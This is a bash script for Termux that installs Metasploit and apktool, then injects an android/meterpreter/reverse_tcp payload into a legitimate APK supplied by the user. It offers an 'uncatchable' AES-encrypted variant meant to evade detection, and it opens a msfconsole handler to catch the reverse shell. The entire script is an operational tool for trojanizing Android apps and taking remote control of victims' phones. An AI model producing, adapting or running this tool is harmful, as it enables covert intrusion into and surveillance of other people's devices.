#!/bin/bash
# Inject Payload in Android APK for Termux
# Modified Version for Termux Environment with Uncatchable Payload Options
clear
cat << EOF

  _____       _           _              _____  _  __
 |_   _|     (_)         | |       /\   |  __ \| |/ /
   | |  _ __  _  ___  ___| |_     /  \  | |__) | ' / 
   | | | '_ \| |/ _ \/ __| __|   / /\ \ |  ___/|  <  
  _| |_| | | | |  __/ (__| |_   / ____ \| |    | . \ 
 |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
            _/ |                                     
           |__/                 Version : 1.0
                             Modified for Termux 

EOF
sleep 2

# Checking and Installing Required Packages
echo "Checking for Required Packages..."
pkg update && pkg upgrade -y
pkg install wget curl metasploit aapt apksigner -y

# Setting Up APKTool
if [ ! -f "$PREFIX/bin/apktool" ]; then
    echo "Setting up APKTool..."
    wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
    wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.0.jar
    chmod +x apktool
    mv apktool $PREFIX/bin/
    mv apktool_2.9.0.jar $PREFIX/bin/
fi

# Setting Up Variables for Injecting
clear
read -p "Set Your LHOST: " lhost
read -p "Set Your LPORT: " lport
echo "APK Files You Have in Current Directory:"
ls *.apk
read -p "Write Clean APK Name: " capk
read -p "Write the Name for the Output APK: " bapk
clear

# Injecting Payload into APK
echo "Injecting Payload into Your APK..."
# Add options for uncatchable payload
echo "Would you like to use an uncatchable payload? (y/n): "
read use_uncatchable

if [ "$use_uncatchable" == "y" ]; then
    msfvenom -x "$capk" -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" --encrypt aes256 -o "$bapk"
else
    msfvenom -x "$capk" -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$bapk"
fi

# Starting Msfconsole Handler
echo "Starting Msfconsole Handler..."
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
